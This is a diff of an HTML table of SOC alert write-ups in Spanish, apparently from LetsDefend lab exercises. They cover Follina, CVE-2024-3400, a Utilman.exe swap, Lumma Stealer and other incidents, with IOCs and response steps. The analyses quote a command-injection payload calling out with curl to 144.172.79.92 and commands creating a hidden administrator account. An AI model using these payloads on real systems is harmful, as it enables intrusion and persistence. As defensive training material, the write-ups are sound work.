@@ -81,6 +81,74 @@ details summary::-webkit-details-marker{display:none}
 				</td>
 			</tr>
 			<tr>
+				<td>Feb, 04, 2025, 04:18 PM</td>
+				<td>SOC336</td>
+				<td>Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)</td>
+				<td>Critical</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1204</span><span class="tag">T1218</span><span class="tag">T1059</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+							Se detectó un correo electrónico enviado desde <span class="code-box">projectmanagement@pm.me</span> hacia <span class="code-box">Austin@letsdefend.io</span> el 4 de febrero de 2025 a las 16:18, con el asunto <span class="code-box">"Important: Action Required for Upcoming Project Deadline"</span>. El mensaje contenía un archivo RTF denominado <span class="code-box">mail.rtf</span>, cuyo hash <span class="code-box">df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184</span> fue identificado como malicioso debido a un patrón asociado con la explotación de <span class="code-box">CVE-2025-21298</span>.
+
+							La acción del dispositivo fue <span class="code-box">Allowed</span>, por lo que el correo y su contenido pudieron llegar al entorno. Durante el análisis del endpoint se identificó posteriormente la ejecución de <span class="code-box">cmd.exe</span>, que utilizó <span class="code-box">regsvr32.exe</span> para cargar <span class="code-box">scrobj.dll</span> y solicitar un script remoto desde <span class="code-box">84.38.130.118</span>.
+
+							Esta actividad es especialmente relevante debido a que <span class="code-box">regsvr32</span> puede utilizarse para ejecutar contenido remoto mediante archivos <span class="code-box">.sct</span>, comportamiento consistente con técnicas de ejecución de código y posible abuso de binarios legítimos de Windows. La secuencia observada relaciona el archivo RTF recibido por correo con la ejecución posterior de herramientas nativas de Windows y la solicitud de contenido desde infraestructura externa, proporcionando evidencia adicional de actividad potencialmente maliciosa asociada al intento de explotación.
+						
+							Se aisla endpoint y se escala a analista SOC L2 para analisis de conexiones de red y posibles mecanismos de persistencia.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Mar, 13, 2025, 09:44 AM</td>
+				<td>SOC338</td>
+				<td>Lumma Stealer - DLL Side-Loading via Click Fix Phishing</td>
+				<td>Critical</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1566</span><span class="tag">T1218</span><span class="tag">T1059</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+							Se detectó un correo electrónico enviado desde <span class="code-box">update@windows-update.site</span> hacia <span class="code-box">dylan@letsdefend.io</span> el 13 de marzo de 2025 a las 09:44 AM, con el asunto <span class="code-box">"Upgrade your system to Windows 11 Pro for FREE"</span>. El mensaje simulaba ofrecer una actualización gratuita a Windows 11 Pro e incluía un enlace hacia <span class="code-box">windows-update.site</span>, utilizando contenido diseñado para inducir al usuario a interactuar con la página. La revisión del historial del navegador confirmó que el usuario accedió al dominio <span class="code-box">windows-update.site</span>.
+
+							Posteriormente, se identificó la ejecución de <span class="code-box">PowerShell</span> junto con <span class="code-box">mshta.exe</span>, utilizado para solicitar contenido remoto desde <span class="code-box">overcoatpassably.shop</span>. La actividad corresponde a un patrón de “ClickFix”, donde se induce al usuario a ejecutar comandos que aparentan formar parte de una verificación CAPTCHA o “I am not a robot”, pero que en realidad permiten descargar o ejecutar una carga maliciosa.
+
+							El comportamiento observado es consistente con una cadena de distribución de Lumma Stealer mediante phishing, utilizando una página fraudulenta de actualización de Windows como señuelo y posteriormente <span class="code-box">PowerShell</span> y <span class="code-box">mshta.exe</span> para ejecutar contenido remoto. El análisis de VirusTotal identificó 14 de 92 proveedores de seguridad que marcaron la URL como maliciosa.
+
+							La acción registrada fue <span class="code-box">Allowed</span>, por lo que el correo fue permitido y existe evidencia de interacción posterior desde el navegador y ejecución de comandos asociados a la carga maliciosa.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Oct, 06, 2023, 08:05 PM</td>
+				<td>SOC227</td>
+				<td>Microsoft SharePoint Server Elevation of Privilege - Possible CVE-2023-29357 Exploitation</td>
+				<td>Critical</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span><span class="tag">T1595</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+							Se detectó actividad sospechosa contra el servidor Microsoft SharePoint <span class="code-box">MS-SharePointServer</span> (<span class="code-box">172.16.17.233</span>) desde la dirección IP externa <span class="code-box">39.91.166.222</span> el 6 de octubre de 2023 a las 20:05. Las solicitudes fueron realizadas mediante GET utilizando el User-Agent <span class="code-box">python-requests/2.28.1</span>, lo que evidencia el uso de una herramienta automatizada para interactuar con la API de SharePoint.
+
+							Durante el análisis se identificaron solicitudes dirigidas a los endpoints <span class="code-box">/_api/web/siteusers</span> y <span class="code-box">/_api/web/currentuser</span>. La consulta a <span class="code-box">/_api/web/currentuser</span> obtuvo una respuesta HTTP 200, mientras que una solicitud a <span class="code-box">/_api/web/siteusers</span> también respondió con HTTP 200, indicando que el servidor procesó correctamente dichas peticiones.
+
+							Adicionalmente, se observó una solicitud hacia <span class="code-box">/_api/web/siteusers/web/siteusers</span> que recibió un código HTTP 404. La secuencia de consultas a <span class="code-box">currentuser</span> y <span class="code-box">siteusers</span> puede ser consistente con una fase de reconocimiento orientada a obtener información sobre usuarios y el contexto del servidor SharePoint.
+
+							El uso de <span class="code-box">python-requests</span> y la consulta de endpoints de la API son compatibles con actividad automatizada. Sin embargo, con estos registros por sí solos no se confirma la explotación exitosa de <span class="code-box">CVE-2023-29357</span>, ya que no se observan evidencias de escalada de privilegios, autenticación indebida o ejecución posterior.
+
+							La actividad fue permitida por el firewall, por lo que las solicitudes alcanzaron el servidor y algunas fueron procesadas correctamente. Se escala a SOC L2.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
 				<td>Aug, 07, 2026, 01:35 AM</td>
 				<td>SOC325</td>
 				<td>Unauthorized Cloud Region Access Attempt Detected</td>
@@ -296,6 +364,145 @@ details summary::-webkit-details-marker{display:none}
 						<summary>Details</summary>
 						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
 						Se detectó un intento de explotación dirigido al firewall <span class="code-box">PA-Firewall-01</span> (<span class="code-box">172.16.17.139</span>) el 18-Apr-2024 a las 03:09 PM, mediante una solicitud POST a <span class="code-box">/global-protect/login.esp</span>. La petición contenía una cookie especialmente manipulada con una carga útil de command injection <span class="code-box">curl${IFS}144.172.79.92:4444?user=$(whoami)</span>, coincidente con los patrones de explotación de la <span class="code-box">CVE-2024-3400</span>. Los registros de PAN-OS muestran que el payload fue procesado por el componente <span class="code-box">device telemetry (dt_send)</span>, el cual intentó ejecutar el comando inyectado y realizar una conexión hacia la dirección IP <span class="code-box">144.172.79.92</span>. La ejecución no se completó exitosamente, registrándose el error <span class="code-box">"DNS lookup failed"</span> durante el intento de conexión. Aunque la acción del dispositivo figura como Allowed, la evidencia confirma un intento de explotación contra el servicio <span class="code-box">GlobalProtect</span>. Se procede a verificar versión PAN-OS en busca de vulnerabilidades relacionadas al CVE mencionado y análisis de IP atacante en búsqueda de posible actividad posterior. Puesta en marcha de actualización/parche PAN-S.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Jun, 21, 2023, 01:51 PM</td>
+				<td>SOC210</td>
+				<td>Possible Brute Force Detected on VPN</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1110</span><span class="tag">T1059</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectaron múltiples intentos fallidos de autenticación VPN desde la dirección IP <span class="code-box">37.19.221.229</span> contra <span class="code-box">vpn-letsdefend.io</span> (<span class="code-box">33.33.33.33</span>), incluyendo intentos utilizando diferentes cuentas. Inicialmente se registró un intento con el usuario <span class="code-box">tane@letsdefend.io</span>, el cual fue rechazado debido a que el usuario no existía. Posteriormente, a las <span class="code-box">13:51</span>, se registró un inicio de sesión exitoso utilizando la cuenta <span class="code-box">mane@letsdefend.io</span> desde la misma dirección IP.
+
+						Tras la autenticación exitosa, se identificó actividad de comandos en el sistema asociada al usuario <span class="code-box">mane</span>, incluyendo consultas del contenido de directorios mediante <span class="code-box">dir /s /b</span>, creación de directorios, recopilación de información de red mediante <span class="code-box">ipconfig /all</span> y <span class="code-box">netstat -ano</span>, ejecución de ping hacia un dominio externo y consulta de información del sistema mediante <span class="code-box">systeminfo</span>. También se observaron operaciones de copia, movimiento y eliminación de archivos dentro del perfil del usuario.
+
+						La secuencia observada muestra múltiples intentos de autenticación desde una misma dirección IP, seguidos de un acceso exitoso y posteriormente diversas actividades de reconocimiento y manipulación de archivos en el sistema. La combinación de estos eventos resulta consistente con un posible acceso no autorizado seguido de reconocimiento del entorno.
+
+						Se procedió a aislar el endpoint, revocar sesión de VPN activa, forzar cambio de contraseña de <span class="code-box">mane</span>, invalidar tokens o sesiones existentes, verificar MFA y sus sesiones. Posteriormente se analiza posibilidad de persistencia o movimiento lateral y determinar impacto, manteniendo a disposición y a conciencia todos los elementos y activos a considerar.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Jun, 21, 2023, 11:02 AM</td>
+				<td>SOC211</td>
+				<td>Utilman.exe Winlogon Exploit Attempt</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1546</span><span class="tag">T1059</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Esta alerta tiene una evidencia mucho más fuerte que una simple ejecución sospechosa, porque tenemos una cadena previa de manipulación del sistema que explica por qué Utilman.exe terminó ejecutándose con privilegios elevados. Se detectó actividad sospechosa en el host Henry (<span class="code-box">172.16.17.149</span>) relacionada con la modificación y ejecución del binario legítimo Utilman.exe, asociado al proceso de accesibilidad de Windows. El evento ocurrió el <span class="code-box">21 de junio de 2023</span> a las <span class="code-box">11:02 AM</span>, donde se observó que Utilman.exe fue ejecutado como proceso hijo de Winlogon.exe.
+
+						Durante el análisis del historial de comandos se identificó que previamente se realizaron modificaciones dentro del directorio <span class="code-box">C:\Windows\System32</span>, donde el archivo original utilman.exe fue renombrado y reemplazado por una copia de cmd.exe. Esta técnica permite abusar del proceso de accesibilidad de Windows para obtener una consola con privilegios elevados desde la pantalla de inicio de sesión.
+
+						Posteriormente, la ejecución de Utilman.exe permitió lanzar comandos administrativos, incluyendo la creación del usuario local <span class="code-box">superman</span> mediante el comando <span class="code-box">net user superman onepunch123 /add</span>. Después de la creación de la cuenta, se agregó dicho usuario al grupo de administradores locales mediante <span class="code-box">net localgroup administrators superman /add</span>, otorgándole privilegios elevados dentro del sistema.
+
+						La secuencia observada muestra una posible escalada de privilegios mediante abuso de Winlogon y reemplazo de Utilman.exe, seguida de creación de una cuenta administrativa para mantener acceso persistente al equipo. La actividad incluye modificación de archivos del sistema, ejecución con privilegios elevados y cambios en la configuración de usuarios locales.
+
+						Se aisla endpoint y elimina nueva cuenta agregada a grupo administradores.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>May, 29, 2023, 01:01 PM</td>
+				<td>SOC202</td>
+				<td>FakeGPT Malicious Chrome Extension</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1176</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó actividad sospechosa en el endpoint <span class="code-box">Samuel</span> (<span class="code-box">172.16.17.173</span>) el <span class="code-box">29-May-2023</span> a las <span class="code-box">13:01</span>, relacionada con la instalación de una extensión maliciosa de Google Chrome identificada como <span class="code-box">hacfaophiklaeolhnmckojjjjbnappen.crx</span>.
+
+						El archivo se encontraba en <span class="code-box">C:\Users\LetsDefend\Download\hacfaophiklaeolhnmckojjjjbnappen.crx</span> y presentó el hash <span class="code-box">7421f9abe5e618a0d517861f4709df53292a5f137053a227bfb4eb8e152a4669</span>. La extensión fue abierta mediante Chrome y posteriormente se observó navegación hacia la Chrome Web Store y las opciones de administración de extensiones, incluyendo la identificación específica de la extensión.
+
+						Posteriormente, el navegador accedió a <span class="code-box">chat.openai.com</span> y a la infraestructura de autenticación <span class="code-box">auth0.openai.com</span>. Esta secuencia resulta relevante debido a que una extensión maliciosa puede potencialmente interactuar con información introducida o utilizada durante la autenticación y navegación del usuario.
+
+						El archivo fue permitido por los controles de seguridad y la extensión quedó instalada en el navegador, por lo que existe evidencia de ejecución e interacción posterior en el endpoint.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Endpoint: <span class="code-box">172.16.17.173</span>
+						- Extensión: <span class="code-box">hacfaophiklaeolhnmckojjjjbnappen.crx</span>
+						- Ruta: <span class="code-box">C:\Users\LetsDefend\Download\hacfaophiklaeolhnmckojjjjbnappen.crx</span>
+						- SHA256: <span class="code-box">7421f9abe5e618a0d517861f4709df53292a5f137053a227bfb4eb8e152a4669</span>
+
+						Se confirma actividad asociada a una extensión maliciosa instalada en Chrome. Se recomienda aislar el endpoint, eliminar la extensión, invalidar sesiones activas y escalar a SOC L2 para revisar posibles credenciales o sesiones comprometidas y realizar hunting sobre el hash e identificador de la extensión.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Sep, 30, 2022, 07:19 AM</td>
+				<td>SOC175</td>
+				<td>PowerShell Found in Requested URL - Possible CVE-2022-41082 Exploitation</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span><span class="tag">T1059.001</span><span class="tag">T1595</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó una solicitud HTTP sospechosa dirigida al servidor Exchange Server 2 (<span class="code-box">172.16.20.8</span>) desde la dirección IP externa <span class="code-box">58.237.200.6</span> el <span class="code-box">30-Sep-2022</span> a las <span class="code-box">07:19 AM</span>. La petición utilizó el método <span class="code-box">GET</span> contra el endpoint <span class="code-box">/autodiscover/autodiscover.json</span>, incorporando parámetros asociados con PowerShell, lo que activó la detección de un posible intento de explotación de <span class="code-box">CVE-2022-41082</span>.
+
+						La solicitud utilizó el User-Agent <span class="code-box">Mozilla/5.0 zgrab/0.x</span>, asociado con herramientas de escaneo y reconocimiento automatizado. Los controles de seguridad bloquearon la solicitud y no se identificaron evidencias de ejecución o explotación exitosa en los registros del endpoint correspondientes al momento de la alerta.
+
+						Durante la revisión se encontraron comandos ejecutados en el servidor el <span class="code-box">22-Sep-2022</span>, donde se utilizó PowerShell para consultar el contenido del escritorio y posteriormente leer el archivo <span class="code-box">exchange-server-commands.txt</span>. Sin embargo, esta actividad ocurrió varios días antes del evento y no existe evidencia suficiente para relacionarla directamente con la solicitud proveniente de <span class="code-box">58.237.200.6</span>.
+
+						La actividad observada es consistente con un intento de reconocimiento o explotación dirigido contra Exchange Server mediante una solicitud manipulada que contiene parámetros relacionados con PowerShell. El intento fue bloqueado y no se observa ejecución posterior asociada directamente al evento.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- IP de origen: <span class="code-box">58.237.200.6</span>
+						- IP de destino: <span class="code-box">172.16.20.8</span>
+						- Endpoint: <span class="code-box">/autodiscover/autodiscover.json</span>
+						- User-Agent: <span class="code-box">Mozilla/5.0 zgrab/0.x</span>
+						- Vulnerabilidad: <span class="code-box">CVE-2022-41082</span>
+
+						Se clasifica como True Positive debido a que la solicitud presenta características compatibles con un intento de explotación y fue dirigida contra un servidor Exchange vulnerable. Al haber sido bloqueada y sin evidencia de compromiso, se recomienda validar la versión de Exchange, revisar eventos adicionales alrededor de la IP de origen y realizar hunting para descartar actividad relacionada.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Jun, 02, 2022, 03:22 PM</td>
+				<td>SOC173</td>
+				<td>Follina 0-Day Detected</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1203</span><span class="tag">T1059.003</span><span class="tag">T1140</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó actividad sospechosa en el endpoint <span class="code-box">JonasPRD</span> (<span class="code-box">172.16.17.39</span>) el <span class="code-box">02-Jun-2022</span> a las <span class="code-box">15:22</span>, relacionada con la explotación de la vulnerabilidad <span class="code-box">CVE-2022-30190</span> (Follina). La alerta se generó tras la ejecución de <span class="code-box">msdt.exe</span> posterior a la apertura del documento de Microsoft Office <span class="code-box">05-2022-0438.doc</span>, cuyo hash registrado es <span class="code-box">52945af1def85b171870b31fa4782e52</span>. El archivo fue permitido por el antivirus.
+
+						Durante la revisión del endpoint se identificó la ejecución de <span class="code-box">cmd.exe</span>, que accedió al directorio <span class="code-box">C:\Users\Public</span> y realizó búsquedas del archivo <span class="code-box">05-2022-0438.rar</span> dentro de directorios temporales. Posteriormente, el contenido fue copiado, procesado mediante <span class="code-box">findstr</span> y decodificado mediante <span class="code-box">certutil</span>. Finalmente, se utilizó <span class="code-box">expand</span> para extraer el contenido y se ejecutó <span class="code-box">rgb.exe</span>.
+
+						La secuencia observada es consistente con una cadena de descarga, decodificación, extracción y ejecución de una carga potencialmente maliciosa. Aunque inicialmente los registros disponibles no coincidían con la hora exacta de la alerta, se identificó actividad correspondiente al mismo día a las <span class="code-box">15:20:56</span>. Adicionalmente, se confirmó que los timestamps de los registros de ejecución fueron eliminados, por lo que la diferencia temporal no permite descartar una relación entre la apertura del documento y las acciones posteriores.
+
+						La actividad presenta múltiples indicadores compatibles con explotación de Follina y ejecución de una carga posterior, incluyendo el abuso de herramientas legítimas de Windows como <span class="code-box">certutil</span> para decodificar contenido y <span class="code-box">expand</span> para extraer archivos.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Endpoint: <span class="code-box">172.16.17.39</span>
+						- Documento: <span class="code-box">05-2022-0438.doc</span>
+						- Hash: <span class="code-box">52945af1def85b171870b31fa4782e52</span>
+						- Archivo comprimido: <span class="code-box">05-2022-0438.rar</span>
+						- Ejecutable: <span class="code-box">rgb.exe</span>
+						- Vulnerabilidad: <span class="code-box">CVE-2022-30190</span>
+
+						Se clasifica como True Positive debido a la combinación de apertura de un documento Office, ejecución de <span class="code-box">msdt.exe</span> y posterior actividad de decodificación, extracción y ejecución de archivos. Se aísla el endpoint y se escala a SOC L2 para realizar deep inspection y Threat Hunting (THT), validando posible persistencia, ejecución posterior y movimiento lateral.
 						</div>
 					</details>
 				</td>
